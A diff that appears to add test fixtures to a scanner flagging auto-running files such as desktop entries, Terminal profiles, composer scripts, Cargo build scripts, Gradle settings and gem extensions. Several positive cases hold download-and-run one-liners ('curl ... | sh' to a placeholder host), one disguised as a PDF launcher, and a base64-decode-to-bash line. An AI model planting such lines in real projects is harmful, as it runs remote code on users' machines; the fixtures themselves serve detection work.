@@ -658,6 +658,126 @@ RC-AUTO-051:
       files:
         docs/shortcuts.md: "Create a .lnk file in the start menu.\n"
 
+RC-AUTO-052:
+  positive:
+    - name: desktop entry that pipes a download into a shell
+      files:
+        docs/Report.desktop: |
+          [Desktop Entry]
+          Type=Application
+          Name=Report.pdf
+          Icon=application-pdf
+          Exec=sh -c "curl -fsSL https://example.invalid/r.sh | sh"
+      expect: [{path: docs/Report.desktop, line: 5}]
+    - name: desktop entry that decodes a payload
+      files:
+        start.desktop: |
+          [Desktop Entry]
+          Type=Application
+          Name=Start
+          Exec=bash -c "echo ZWNobyBoZWxsbw== | base64 -d | bash"
+      expect: [{path: start.desktop, line: 4}]
+  negative:
+    - name: application launcher of a desktop app
+      files:
+        data/org.example.Viewer.desktop: |
+          [Desktop Entry]
+          Type=Application
+          Name=Viewer
+          Comment=View curl and wget logs
+          Exec=viewer %U
+          TryExec=viewer
+          Icon=org.example.Viewer
+    - name: download command in a shell script
+      files:
+        install.sh: "curl -fsSL https://example.invalid/i.sh | sh\n"
+
+RC-AUTO-053:
+  positive:
+    - name: Terminal script for macOS users
+      files:
+        Start.command: "#!/bin/sh\ncd \"$(dirname \"$0\")\" && ./run.sh\n"
+      expect: [{path: Start.command}]
+  negative:
+    - name: shell script and a document about commands
+      files:
+        start.sh: "#!/bin/sh\n./run.sh\n"
+        docs/command.md: "Run the start.command file.\n"
+
+RC-AUTO-054:
+  positive:
+    - name: Terminal profile with a startup command
+      files:
+        Setup.terminal: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <plist version="1.0">
+          <dict>
+            <key>CommandString</key>
+            <string>curl -s https://example.invalid/x.sh | sh</string>
+            <key>RunCommandAsShell</key>
+            <true/>
+          </dict>
+          </plist>
+      expect: [{path: Setup.terminal, line: 4}]
+  negative:
+    - name: Terminal profile with colors only
+      files:
+        Theme.terminal: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <plist version="1.0">
+          <dict>
+            <key>name</key>
+            <string>Solarized</string>
+            <key>FontAntialias</key>
+            <true/>
+          </dict>
+          </plist>
+
+RC-AUTO-055:
+  positive:
+    - name: location file that opens an application
+      files:
+        Docs.webloc: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <plist version="1.0">
+          <dict>
+            <key>URL</key>
+            <string>file:///Applications/Utilities/Terminal.app</string>
+          </dict>
+          </plist>
+      expect: [{path: Docs.webloc, line: 5}]
+    - name: compact location file pointing to a share
+      files:
+        share.inetloc: "<plist version=\"1.0\"><dict><key>URL</key><string>smb://files.example.invalid/share</string></dict></plist>\n"
+      expect: [{path: share.inetloc, line: 1}]
+  negative:
+    - name: link to the project website
+      files:
+        Website.webloc: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <plist version="1.0">
+          <dict>
+            <key>URL</key>
+            <string>https://example.invalid/docs</string>
+          </dict>
+          </plist>
+
+RC-AUTO-056:
+  positive:
+    - name: application bundle with a script as its program
+      files:
+        tools/Helper.app/Contents/Info.plist: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <plist version="1.0"><dict><key>CFBundleExecutable</key><string>run</string></dict></plist>
+        tools/Helper.app/Contents/MacOS/run: "#!/bin/sh\necho hello\n"
+      expect: [{path: tools/Helper.app/Contents/Info.plist}]
+  negative:
+    - name: Info.plist of an Xcode project
+      files:
+        Sources/App/Info.plist: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <plist version="1.0"><dict><key>CFBundleName</key><string>App</string></dict></plist>
+
 RC-AUTO-033:
   positive:
     - name: custom clean/smudge filter
@@ -810,3 +930,182 @@ RC-AUTO-072:
           <Project>
             <UsingTask TaskName="Sign" AssemblyFile="tools/Sign.dll" />
           </Project>
+
+RC-AUTO-080:
+  positive:
+    - name: post-install script
+      files:
+        composer.json: |
+          {
+            "name": "example/app",
+            "scripts": {
+              "post-install-cmd": ["@php bin/setup.php"],
+              "test": "phpunit"
+            }
+          }
+      expect: [{path: composer.json}]
+  negative:
+    - name: only manually run scripts
+      files:
+        composer.json: |
+          {"name": "example/lib", "scripts": {"test": "phpunit", "lint": "phpcs"}}
+    - name: dependency inside vendor
+      files:
+        vendor/example/dep/composer.json: |
+          {"scripts": {"post-install-cmd": "php setup.php"}}
+
+RC-AUTO-081:
+  positive:
+    - name: install script pipes a download into a shell
+      files:
+        composer.json: |
+          {"scripts": {"post-update-cmd": "curl -s https://example.invalid/i.sh | sh"}}
+      expect: [{path: composer.json}]
+  negative:
+    - name: scripts that call local tools
+      files:
+        composer.json: |
+          {"scripts": {"post-install-cmd": ["@php artisan key:generate"], "test": "phpunit"}}
+
+RC-AUTO-082:
+  positive:
+    - name: crate with a build script
+      files:
+        Cargo.toml: "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n"
+        build.rs: "fn main() { println!(\"cargo:rerun-if-changed=build.rs\"); }\n"
+      expect: [{path: build.rs}]
+  negative:
+    - name: crate without a build script
+      files:
+        Cargo.toml: "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n"
+        src/build.md: "Run cargo build.\n"
+
+RC-AUTO-083:
+  positive:
+    - name: build script downloads with an HTTP client
+      files:
+        build.rs: |
+          fn main() {
+              let body = reqwest::blocking::get("https://example.invalid/lib.tar.gz").unwrap();
+              let _ = body;
+          }
+      expect: [{path: build.rs, line: 2}]
+    - name: build script starts curl
+      files:
+        crates/sys/build.rs: |
+          use std::process::Command;
+          fn main() {
+              Command::new("curl").arg("-o").arg("x.so").arg("https://example.invalid/x.so").status().unwrap();
+          }
+      expect: [{path: crates/sys/build.rs, line: 3}]
+  negative:
+    - name: build script compiles C code and runs git
+      files:
+        build.rs: |
+          use std::process::Command;
+          // reqwest:: is not used here
+          fn main() {
+              cc::Build::new().file("src/shim.c").compile("shim");
+              let _ = Command::new("git").args(["rev-parse", "HEAD"]).output();
+          }
+
+RC-AUTO-084:
+  positive:
+    - name: Groovy string executed at configuration time
+      files:
+        build.gradle: |
+          plugins { id 'java' }
+          def rev = "git rev-parse HEAD".execute().text.trim()
+      expect: [{path: build.gradle, line: 2}]
+    - name: Kotlin exec block
+      files:
+        app/build.gradle.kts: |
+          tasks.register("gen") {
+              doLast {
+                  exec {
+                      commandLine("python3", "tools/gen.py")
+                  }
+              }
+          }
+      expect: [{path: app/build.gradle.kts, line: 3}, {path: app/build.gradle.kts, line: 4}]
+  negative:
+    - name: ordinary Java build
+      files:
+        build.gradle: |
+          plugins { id 'java' }
+          // "x".execute() was removed
+          dependencies { implementation 'org.example:lib:1.0' }
+          tasks.named('test') { useJUnitPlatform() }
+
+RC-AUTO-085:
+  positive:
+    - name: settings script pipes a download into a shell
+      files:
+        settings.gradle: |
+          rootProject.name = 'demo'
+          ['sh', '-c', 'curl -s https://example.invalid/x.sh | sh'].execute()
+      expect: [{path: settings.gradle, line: 2}]
+  negative:
+    - name: repository declarations with URLs
+      files:
+        settings.gradle: |
+          dependencyResolutionManagement {
+              repositories { mavenCentral(); maven { url 'https://example.invalid/maven' } }
+          }
+
+RC-AUTO-086:
+  positive:
+    - name: wrapper distribution from another host
+      files:
+        gradle/wrapper/gradle-wrapper.properties: |
+          distributionBase=GRADLE_USER_HOME
+          distributionUrl=https\://example.invalid/gradle-8.10-bin.zip
+      expect: [{path: gradle/wrapper/gradle-wrapper.properties, line: 2}]
+  negative:
+    - name: official distribution
+      files:
+        gradle/wrapper/gradle-wrapper.properties: |
+          distributionBase=GRADLE_USER_HOME
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.10-bin.zip
+          distributionSha256Sum=0000000000000000000000000000000000000000000000000000000000000000
+
+RC-AUTO-087:
+  positive:
+    - name: gem with a C extension
+      files:
+        demo.gemspec: |
+          Gem::Specification.new do |spec|
+            spec.name = "demo"
+            spec.files = `git ls-files -z`.split("\x0")
+            spec.extensions = ["ext/demo/extconf.rb"]
+          end
+      expect: [{path: demo.gemspec, line: 4}]
+  negative:
+    - name: pure Ruby gem
+      files:
+        demo.gemspec: |
+          Gem::Specification.new do |spec|
+            spec.name = "demo"
+            # spec.extensions = ["ext/demo/extconf.rb"]
+            spec.files = Dir["lib/**/*.rb"]
+          end
+
+RC-AUTO-088:
+  positive:
+    - name: extconf.rb pipes a download into a shell
+      files:
+        ext/demo/extconf.rb: |
+          require "mkmf"
+          system("curl -fsSL https://example.invalid/setup.sh | bash")
+          create_makefile("demo")
+      expect: [{path: ext/demo/extconf.rb, line: 2}]
+  negative:
+    - name: Gemfile with sources and a Rakefile with tasks
+      files:
+        Gemfile: |
+          source "https://rubygems.org"
+          gem "rake"
+        Rakefile: |
+          task :default do
+            sh "bundle exec rspec"
+          end
